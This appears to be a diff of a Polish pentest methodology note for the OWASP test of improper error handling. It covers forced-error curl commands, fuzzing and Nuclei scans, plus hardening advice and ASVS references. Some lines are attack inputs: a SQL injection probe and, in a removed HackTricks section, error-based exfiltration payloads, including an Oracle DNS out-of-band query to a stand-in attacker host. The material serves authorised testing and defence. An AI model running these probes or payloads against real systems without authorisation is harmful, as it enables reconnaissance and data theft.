@@ -1,172 +1,73 @@
 # WSTG-ERRH-01 — Testing for Improper Error Handling
 
-## Cele
+## Cel
 
-- Zidentyfikowac istniejace wyjscia bledow (error output)
-- Przeanalizowac rozne typy zwracanych odpowiedzi bledow
+Wykrycie ujawnienia szczegółów technicznych w odpowiedziach na błędy (4xx/5xx) — server banner, framework version, file paths, SQL fragments. Atakujący wykorzystuje te informacje w fazie rekonesansu do CVE matching i pivot do konkretnych ataków.
 
-## KOMENDY
+## Automatyzacja Nuclei
 
-### Wymuszenie bledu 404 (Not Found)
-
-```bash
-curl -s -o /dev/null -w "%{http_code}\n" TARGET/nieistniejaca-strona-12345
-
-```
-
-### Wymuszenie bledu 404 z pelna odpowiedzia
+### Nasz dedykowany szablon
 
 ```bash
-curl -v TARGET/nieistniejaca-strona-12345
-
+nuclei -l burp-export.xml -im burp \
+       -t templates/wstg-errh-01-error-page.yaml \
+       -proxy http://127.0.0.1:8080 \
+       -o results/wstg-errh-01.jsonl
 ```
 
-### Wymuszenie bledu 500 (Internal Server Error) za pomoca nieprawidlowych parametrow
+Szablon w 3 grupach: forced 404 + analiza error page (server banner, filesystem paths), forced 500 via malformed query (Django yellow page, ASP.NET YSD, PHP warnings, Laravel Whoops, Rails dev page, Symfony, Java/Spring stack trace, Werkzeug, SQL errors), 405 Method Not Allowed via PROPFIND.
+
+### Dodatkowe oficjalne szablony Nuclei
 
 ```bash
-curl -v "TARGET/search?q=%00%ff%fe"
+# Misconfiguration directory ma wzorce na error pages
+nuclei -l burp-export.xml -im burp \
+       -t resources/nuclei-templates/http/misconfiguration/ -tags errordisclosure
 
+# Cross-ref WSTG-CONF-02 platform config (debug consoles, verbose errors)
+nuclei -l burp-export.xml -im burp \
+       -t templates/wstg-conf-02-platform-config.yaml
+
+# Cross-ref WSTG-ERRH-02 dla pełnego stack trace coverage
+nuclei -l burp-export.xml -im burp \
+       -t templates/wstg-errh-02-stack-trace.yaml
 ```
 
-### Wymuszenie bledu 403 (Forbidden)
+## Coverage Matrix
 
-```bash
-curl -v TARGET/.htaccess
-curl -v TARGET/admin/
-curl -v TARGET/server-status
+| Wymiar | Pokryte | Nie pokryte |
+|---|---|---|
+| Default error pages (Apache/Nginx/IIS/Tomcat) | ✓ | — |
+| Forced 404 + server banner | ✓ | — |
+| Forced 500 + framework markers | ✓ | — |
+| Django/Rails/ASP.NET/PHP/Laravel/Symfony specific errors | ✓ | — |
+| SQL errors w error pages | ✓ | (cross WSTG-INPV-05) |
+| Filesystem path disclosure | ✓ | — |
+| Stack trace specifically | częściowe | osobno → WSTG-ERRH-02 |
+| Custom error pages bypass | — | manual z różnymi inputs |
 
-```
+## Standard pentesterski — jak to robi się wzorowo
 
-### Wysylanie nieprawidlowego Content-Type
+### Metodologia (5 kroków)
 
-```bash
-curl -v -X POST TARGET/login -H "Content-Type: application/xml" -d '<<<invalid'
+1. **Forced errors arsenal**: random nonexistent path (404), malformed query (500), special chars (`%00`, `%3C%3E`), oversized headers, PROPFIND/JUNK methods.
+2. **Per status analysis**: zbierać responses 400/401/403/404/405/500/502/503/504 — każdy może ujawnić różne info.
+3. **Stack-specific markers**: znajomość frameworka pozwala targeted error trigger (np. Django `?_invalid_filter=`, Rails `/admin/.invalid`, ASP.NET `/<>`).
+4. **Custom error page audit**: nawet zhardenowane aplikacje mogą mieć custom 500 page który nadal ujawnia framework przez body markers (logo, footer text).
+5. **CDN behavior**: porównanie 404 z CDN vs origin — czasem origin error pages dostępne przez direct backend.
 
-```
+### Co MUSI być sprawdzone (10 punktów)
 
-### Wysylanie zdjeformatowanego JSON
-
-```bash
-curl -v -X POST TARGET/api/endpoint -H "Content-Type: application/json" -d '{invalid json###'
-
-```
-
-### Wysylanie bardzo dlugiego URL
-
-```bash
-curl -v "TARGET/$(python3 -c "print('A'*10000)")"
-
-```
-
-### Wysylanie nieprawidlowej metody HTTP
-
-```bash
-curl -v -X PATCH TARGET/
-curl -v -X DELETE TARGET/
-curl -v -X PROPFIND TARGET/
-
-```
-
-### Wysylanie nieprawidlowych naglowkow
-
-```bash
-curl -v -H "Host: " TARGET/
-curl -v -H "Content-Length: -1" TARGET/
-
-```
-
-### Testowanie overflow parametrow
-
-```bash
-curl -v "TARGET/page?id=99999999999999999999"
-curl -v "TARGET/page?id=-1"
-curl -v "TARGET/page?id=abc"
-
-```
-
-### Wymuszenie bledow SQL (jezeli istnieje injection)
-
-```bash
-curl -v "TARGET/page?id=1'"
-curl -v "TARGET/page?id=1%27%20OR%201=1--"
-
-```
-
-### Nmap skanowanie stron bledow
-
-```bash
-nmap --script http-errors -p 80,443 TARGET
-
-```
-
-### Nikto skanowanie bledow konfiguracji
-
-```bash
-nikto -h TARGET -Tuning 3
-
-```
-
-### Burp Suite - testowanie odpowiedzi na bledy
-
-```bash
-# 1. Uruchom Burp Suite -> Proxy -> Intercept
-# 2. Przechwytuj request i modyfikuj parametry na nieprawidlowe wartosci
-# 3. Obserwuj odpowiedzi serwera pod katem ujawniania informacji
-
-```
-
-## KOMENDY Z WORDLISTAMI
-
-### Fuzzowanie sciezek w celu wymuszenia bledow (fuzzdb disclosure-directory)
-
-```bash
-ffuf -u TARGET/FUZZ -w Desktop/WSTG/fuzzdb-master/attack/disclosure-directory/directory-indexing-generic.txt -mc all -fc 200,301,302 -c
-
-```
-
-### Fuzzowanie z payload'ami naughty strings (SecLists)
-
-```bash
-ffuf -u "TARGET/search?q=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/big-list-of-naughty-strings.txt -mc all -fc 200 -c
-
-```
-
-### Wfuzz testowanie bledow na roznych endpointach
-
-```bash
-wfuzz -c --hc 200,301,302 -w Desktop/WSTG/fuzzdb-master/attack/disclosure-directory/directory-indexing-generic.txt TARGET/FUZZ
-
-```
-
-### Fuzzowanie parametrow wyzwalajacych bledy
-
-```bash
-ffuf -u "TARGET/page?FUZZ=test" -w Desktop/WSTG/fuzzdb-master/attack/business-logic/CommonDebugParamNames.txt -mc all -fc 200 -c
-
-```
-
-### Fuzzowanie z debug param names (fuzzdb)
-
-```bash
-ffuf -u "TARGET/?FUZZ=true" -w Desktop/WSTG/fuzzdb-master/attack/business-logic/DebugParams.Json.fuzz.txt -mc all -fc 200 -c
-
-```
-
-## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
-
-1. Otworz przegladarke i odwiedz nieistniejace strony - sprawdz czy strony bledow ujawniaja
-```bash
-   technologie (np. Apache, Nginx, IIS, Tomcat, wersje frameworkow)
-```
-
-2. W Burp Suite -> Repeater: wyslij requesty z nieprawidlowymi danymi i analizuj odpowiedzi
-3. Sprawdz czy bledy zawieraja sciezki plikow, nazwy bazy danych, stack traces
-4. Sprawdz czy rozne kody bledow (400, 403, 404, 405, 500, 502, 503) zwracaja rozne informacje
-5. Sprawdz naglowki odpowiedzi pod katem Server, X-Powered-By, X-AspNet-Version
-6. Zrob screenshot kazdej unikalnej strony bledu jako dowod
-
-
----
+- [ ] 404 → server banner w body (Apache/Nginx/IIS/Tomcat default page)
+- [ ] 500 → stack trace, file paths, SQL queries
+- [ ] 4xx różne → różne informacje per status
+- [ ] PROPFIND / OPTIONS na nieobsługiwane endpointy
+- [ ] Malformed query parameters → debug info
+- [ ] Special chars w path/query → error fallback
+- [ ] Oversized headers (`A` × 10000) → server-side parser error
+- [ ] Custom 500 page review — czy zawiera tech markers
+- [ ] Headers w error responses (X-Powered-By, Server)
+- [ ] CDN vs origin error response delta
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
@@ -174,84 +75,95 @@ ffuf -u "TARGET/?FUZZ=true" -w Desktop/WSTG/fuzzdb-master/attack/business-logic/
 
 ### Dlaczego error handling jest krytyczny
 
-- Nieobsluzony blad moze ujawnic: nazwe i wersje serwera, frameworki, sciezki plikow, zapytania SQL, connection strings, nazwy tabel
-- Atakujacy wykorzystuja te informacje w fazie **Reconnaissance** — identyfikacja technologii, injection points, wersji z znanymi CVE
-- Przyklad: stack trace Struts2/Tomcat ujawnia `com.opensymphony.xwork2` + `Apache Tomcat/7.0.56` — atakujacy wie co atakowac
+- Nieobsłużony błąd może ujawnić: nazwę i wersję serwera, frameworki, ścieżki plików, zapytania SQL, connection strings, nazwy tabel
+- Atakujący wykorzystują te informacje w fazie **Reconnaissance** — identyfikacja technologii, injection points, wersji z znanymi CVE
+- Przykład: stack trace Struts2/Tomcat ujawnia `com.opensymphony.xwork2` + `Apache Tomcat/7.0.56` — atakujący wie co atakować
 
-### Zasady ogolne
+### Zasady ogólne
 
-- **Generyczne odpowiedzi dla uzytkownika** — zwracaj ogolny komunikat np. `{"message":"An error occurred, please retry"}`
-- **Szczegolowe logowanie SERVER-SIDE** — loguj pelny stack trace, request details, user context po stronie serwera
-- **Obsluz WSZYSTKIE typy wyjatkow** — nieobsluzony wyjatek moze ujawnic wrazliwe dane techniczne
-- **Wdroz globalny error handler** — zapobiegaj niespojnym odpowiedziom na roznych endpointach
-- **Uzywaj kodow HTTP poprawnie**: 4xx dla bledow klienta (unauthorized, bad request), 5xx dla bledow serwera
-- **RFC 7807** (Problem Details for HTTP APIs) — standardowy format odpowiedzi bledow w REST API: `application/problem+json`
+- **Generyczne odpowiedzi dla użytkownika** — zwracaj ogólny komunikat np. `{"message":"An error occurred, please retry"}`
+- **Szczegółowe logowanie SERVER-SIDE** — loguj pełny stack trace, request details, user context po stronie serwera
+- **Obsłuż WSZYSTKIE typy wyjątków** — nieobsłużony wyjątek może ujawnić wrażliwe dane techniczne
+- **Wdróż globalny error handler** — zapobiegaj niespójnym odpowiedziom na różnych endpointach
+- **Używaj kodów HTTP poprawnie**: 4xx dla błędów klienta (unauthorized, bad request), 5xx dla błędów serwera
+- **RFC 7807** (Problem Details for HTTP APIs) — standardowy format odpowiedzi błędów w REST API: `application/problem+json`
 
 ### Globalny error handler — konfiguracja wg technologii
 
 - **Standard Java (web.xml)**: `<error-page><exception-type>java.lang.Exception</exception-type><location>/error.jsp</location></error-page>`
-- **Spring MVC/Boot**: klasa z `@RestControllerAdvice` + `@ExceptionHandler(Exception.class)` zwracajaca `ProblemDetail` (Spring 6+ RFC 7807)
+- **Spring MVC/Boot**: klasa z `@RestControllerAdvice` + `@ExceptionHandler(Exception.class)` zwracająca `ProblemDetail` (Spring 6+ RFC 7807)
 - **ASP.NET Core**: `app.UseExceptionHandler("/api/error")` w `Startup.cs` — dedykowany ErrorController zwraca generyczny JSON
-  - W DEV: `app.UseDeveloperExceptionPage()` — WYLACZ na produkcji
-  - `app.UseStatusCodePages()` — custom odpowiedzi dla kodow statusu
+  - W DEV: `app.UseDeveloperExceptionPage()` — WYŁĄCZ na produkcji
+  - `app.UseStatusCodePages()` — custom odpowiedzi dla kodów statusu
 - **ASP.NET Web API (.NET Framework)**: zarejestruj `ExceptionLogger` + `ExceptionHandler` w `WebApiConfig.Register()`
   - `config.Services.Replace(typeof(IExceptionLogger), new GlobalErrorLogger())`
   - `config.Services.Replace(typeof(IExceptionHandler), new GlobalErrorHandler())`
   - `<customErrors mode="RemoteOnly">` w Web.config
 
-### Co NIE powinno byc w odpowiedzi bledu
+### Co NIE powinno być w odpowiedzi błędu
 
 - Stack traces, numery linii kodu, nazwy klas
-- Sciezki plikow (`D:\app\index_new.php on line 188`)
+- Ścieżki plików (`D:\app\index_new.php on line 188`)
 - Zapytania SQL, connection strings, nazwy tabel
 - Wersje serwera, frameworka, bibliotek
-- Zmienne srodowiskowe, konfiguracja
+- Zmienne środowiskowe, konfiguracja
 
-### Kody HTTP — poprawne uzycie
+### Kody HTTP — poprawne użycie
 
-- **4xx** — blad klienta: 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 405 Method Not Allowed, 429 Too Many Requests
-- **5xx** — blad serwera: 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable
-- Monitoruj bledy 5xx — wskazuja na nieoczekiwane awarie aplikacji
-- NIE zwracaj szczegolow implementacji w body odpowiedzi — uzywaj generycznych komunikatow
+- **4xx** — błąd klienta: 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 405 Method Not Allowed, 429 Too Many Requests
+- **5xx** — błąd serwera: 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable
+- Monitoruj błędy 5xx — wskazują na nieoczekiwane awarie aplikacji
+- NIE zwracaj szczegółów implementacji w body odpowiedzi — używaj generycznych komunikatów
 
 ### Dodatkowe najlepsze praktyki
 
-- Dodaj header `X-ERROR: true` do odpowiedzi bledow — ulatwia client-side error handling
-- Uzywaj [Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) do prawidlowego logowania bledow
-- Testuj error handling na produkcji — upewnij sie ze debug mode jest WYLACZONY
-- Sprawdz czy reverse proxy/CDN nie dodaje wlasnych stron bledow z informacjami technicznymi
+- Dodaj header `X-ERROR: true` do odpowiedzi błędów — ułatwia client-side error handling
+- Używaj [Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) do prawidłowego logowania błędów
+- Testuj error handling na produkcji — upewnij się że debug mode jest WYŁĄCZONY
+- Sprawdź czy reverse proxy/CDN nie dodaje własnych stron błędów z informacjami technicznymi
 
-## ROZSZERZENIA BURP SUITE
+## Pentesterskie deep dive
+
+### Mniej znane techniki
+
+- **Forced TypeError via array params**: `?id[]=1&id[]=2` zamiast `?id=1` — niektóre frameworki (PHP, Express) zwracają stack trace gdy oczekują string a dostają array.
+- **`Accept` header confusion**: `Accept: application/xml` na endpoincie który normalnie zwraca JSON może wymusić error w content negotiation.
+- **HTTP/1.0 vs HTTP/1.1 differences**: `curl --http1.0` może wymusić error gdy aplikacja oczekuje konkretnych headers.
+- **Oversized body / header**: 100MB body lub `User-Agent: A × 100000` — często wywołuje server-side parsing error.
+- **Reverse proxy 502 leak**: gdy backend down, proxy zwraca 502 z banner backendu (np. `proxy_pass http://internal-backend:8080` — internal hostname leaked).
+- **JSON parse error reflects malformed input**: `{"id":1,"name":"<script>` może być reflectowane w error message (cross XSS).
+
+### Common pitfalls
+
+- **CDN custom error pages**: Cloudflare zwraca własną stronę 502/520/521 — może maskować prawdziwy backend status.
+- **`debug=1` query params**: legacy aplikacje akceptują `?debug=1`, `?show_errors=1` które aktywują verbose mode bez auth.
+- **Production database dev endpoint**: niektóre aplikacje mają `/health/db` ujawniające connection string przy błędzie.
+
+### Świeżynki z research
+
+- **GraphQL field suggestion errors** — community pattern; `query{user(id:1){nonexistent}}` zwraca podpowiedzi z lookalike fields.
+- **API gateway error formats** — różne formaty error response per gateway (AWS API Gateway, Azure API Management, Kong) ujawniają provider.
+- **HackTricks Pentesting Web — Error Pages**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web
+
+## Rozszerzenia Burp Suite
 
 | Rozszerzenie | Opis | Link |
 |---|---|---|
-| Error Message Checks | Pasywne wykrywanie komunikatow bledow ujawniajacych informacje | [GitHub](https://github.com/augustd/burp-suite-error-message-checks) |
+| Software Version Reporter | Detekcja info disclosure w error responses | [GitHub](https://github.com/augustd/burp-suite-software-version-checks) |
+| Backslash Powered Scanner | Probe-based detection of error-disclosing inputs | [GitHub](https://github.com/PortSwigger/backslash-powered-scanner) |
+| Param Miner | Hidden parameter discovery (debug params) | [GitHub](https://github.com/PortSwigger/param-miner) |
 
----
+## Źródła
 
-## Wskazówki ASVS
+- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_for_Improper_Error_Handling
+- OWASP Error Handling Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html
+- RFC 7807 (Problem Details): https://datatracker.ietf.org/doc/html/rfc7807
+- HackTricks Pentesting Web: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web
 
-Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.
-
-### L2 (Standardowy)
-
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V16.5.1 | Error Handling | Verify that a generic message is returned to the consumer when an unexpected or security-sensitive error occurs, ensuring no exposure of sensitive internal system data such as stack traces, queries, secret keys, and tokens. |
-| V16.5.2 | Error Handling | Verify that the application continues to operate securely when external resource access fails, for example, by using patterns such as circuit breakers or graceful degradation. |
-| V16.5.3 | Error Handling | Verify that the application fails gracefully and securely, including when an exception occurs, preventing fail-open conditions such as processing a transaction despite errors resulting from validation logic. |
-
-### L3 (Zaawansowany)
+### Wskazówki ASVS
 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
-| V16.5.4 | Error Handling | Verify that a "last resort" error handler is defined which will catch all unhandled exceptions. This is both to avoid losing error details that must go to log files and to ensure that an error does not take down the entire application process, leading to a loss of availability. |
-
-
----
-
-## HackTricks Tips
-
-- **Error-based data exfil** (MSSQL): `1'+user_name(@@version)--` → type mismatch error leaks value
-- **JSON error exfil** (MongoDB `$where`): `throw new Error(JSON.stringify(this))` → full document w error
-- **Oracle DNS OOB via error**: `DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.attacker',80)` — error = port closed, session = open
+| V7.4.1 | Error Handling (L1) | Generic message returned for all error states. |
+| V7.4.2 | Error Handling (L2) | Application logs all unhandled exceptions. |
+| V7.4.3 | Error Handling (L2) | All errors logged including unexpected error conditions. |
